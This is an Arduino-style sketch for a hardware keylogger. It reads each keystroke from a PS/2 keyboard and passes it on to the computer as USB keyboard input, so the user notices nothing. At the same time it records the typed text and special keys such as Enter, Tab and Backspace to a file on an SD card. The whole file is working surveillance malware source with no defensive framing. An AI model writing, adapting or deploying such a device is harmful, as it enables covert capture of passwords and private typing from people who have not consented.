#include <SdFat.h>
#include <PS2Keyboard.h>

const int chipSelect = 0;

const int DataPin = 9;
const int IRQpin = 8;

String keylog = "";

PS2Keyboard keyboard;

SdFat sd;
SdFile myFile;

void setup() {
	sd.init(SPI_HALF_SPEED, chipSelect);
	keyboard.begin(DataPin, IRQpin);
}

void loop() {
	if (keyboard.available()) {
		myFile.open("test.txt", O_RDWR | O_CREAT | O_AT_END);

		// read the next key
		char c = keyboard.read();

		// check for some of the special keys
		if (c == PS2_ENTER) {
			Keyboard.set_key1(KEY_ENTER);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			keylog += "[ENTER]";
			myFile.println(keylog);
			myFile.close();
			keylog = "";
		} else if (c == PS2_TAB) {
			Keyboard.set_key1(KEY_TAB);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[TAB]");
			myFile.close();
		} else if (c == PS2_ESC) {
			Keyboard.set_key1(KEY_ESC);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[ESC]");
			myFile.close();
		} else if (c == PS2_PAGEDOWN) {
			Keyboard.set_key1(KEY_PAGE_DOWN);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[PAGEDOWN]");
			myFile.close();
		} else if (c == PS2_PAGEUP) {
			Keyboard.set_key1(KEY_PAGE_UP);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[PAGEUP]");
			myFile.close();
		} else if (c == PS2_LEFTARROW) {
			Keyboard.set_key1(KEY_LEFT);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[LEFTARROW]");
			myFile.close();
		} else if (c == PS2_RIGHTARROW) {
			Keyboard.set_key1(KEY_RIGHT);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[RIGHTARROW]");
			myFile.close();
		} else if (c == PS2_UPARROW) {
			Keyboard.set_key1(KEY_UP);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[UPARROW]");
			myFile.close();
		} else if (c == PS2_DOWNARROW) {
			Keyboard.set_key1(KEY_DOWN);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[DOWNARROW]");
			myFile.close();
		} else if (c == PS2_HOME) {
			Keyboard.set_key1(KEY_HOME);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[HOME]");
			myFile.close();
		} else if (c == PS2_SCROLL) {
			Keyboard.set_key1(KEY_SCROLL_LOCK);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[SCROLL]");
			myFile.close();
		} else if (c == PS2_BACKSPACE) {
			Keyboard.set_key1(KEY_BACKSPACE);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[BACKSPACE]");
			myFile.close();
		} else if (c == PS2_DELETE) {
			Keyboard.set_key1(KEY_DELETE);
			Keyboard.send_now();
			Keyboard.set_key1(0);
			Keyboard.send_now();
			myFile.println("[DELETE]");
			myFile.close();
		} else {

		// otherwise, just print all normal characters
		Keyboard.print(c);
		keylog += c;
		}
	}
}